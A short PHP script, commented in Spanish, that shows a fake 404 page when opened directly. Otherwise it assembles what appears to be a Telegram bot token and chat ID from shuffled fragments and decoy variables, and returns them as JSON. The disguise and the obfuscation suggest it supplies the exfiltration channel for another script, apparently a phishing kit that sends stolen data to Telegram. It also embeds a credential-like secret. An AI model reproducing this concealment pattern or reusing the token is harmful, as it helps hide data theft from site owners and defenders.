<?php
if (basename($_SERVER['PHP_SELF']) == basename(__FILE__)) {
    header("HTTP/1.0 404 Not Found");
    echo "<h1 style='font-size: 50px; color: red; text-align: center;'>404 Not Found</h1>";
    exit;
}

// Variables que conforman el token y chat_id
$a1 = "7461";
$b5 = "xYR"; 
$d9 = "0837";
$c2 = "85:";
$g7 = "gDSh";
$x3 = "5RGq";
$z0 = "nvK";
$e4 = "AAER";
$f8 = "LxYK";
$h6 = "vf2Q";
$p2 = "zLm"; 
$i9 = "eq9z";
$t1 = "R1el";
$j5 = "HeU_";
$q7 = "EQc";

// Concatenamos para formar el token
$token = $a1 . $d9 . $c2 . $e4 . $x3 . $i9 . $f8 . $g7 . $h6 . $t1 . $j5 . $q7;

// Concatenamos para formar el chat_id
$ch1 = "761";
$v4 = "993"; 
$ch2 = "515";
$ch3 = "6506";
$chat_id = $ch2 . $ch1 . $ch3;

// Enviamos el token y el chat_id en formato JSON
echo json_encode(array(
    "token" => $token,
    "chat_id" => $chat_id
));

?>
